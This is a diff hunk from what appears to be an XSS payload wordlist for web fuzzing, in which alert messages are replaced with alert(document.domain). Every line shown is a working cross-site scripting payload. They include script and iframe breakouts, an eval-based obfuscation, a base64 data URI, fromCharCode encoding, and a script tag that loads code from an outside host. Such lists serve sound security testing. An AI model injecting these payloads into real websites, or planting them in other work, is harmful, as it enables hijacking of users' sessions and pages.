@@ -2174,14 +2174,14 @@ a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
 src="http://www.site.com/XSS.js"></script>
 data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
 !--" /><script>alert('xss');</script>
-<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
-"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
-'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
-<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
-<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
-"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
-'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
-<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
+<script>alert(document.domain)</script><marquee><h1>XSS</h1></marquee>
+"><script>alert(document.domain)</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>alert(document.domain)</script>><marquee><h1>XSS by xss</h1></marquee>
+<img """><script>alert(document.domain)</script><marquee><h1>XSS by xss</h1></marquee>
+<script>alert(document.domain)</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>alert(document.domain)</script>"><script>alert("XSS by \nxss</h1></marquee>
+'"></title><script>alert(document.domain)</script>><marquee><h1>XSS by xss</h1></marquee>
+<iframe src="javascript:alert(document.domain);"></iframe><marquee><h1>XSS by xss</h1></marquee>
 '><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
 "><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
 \'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
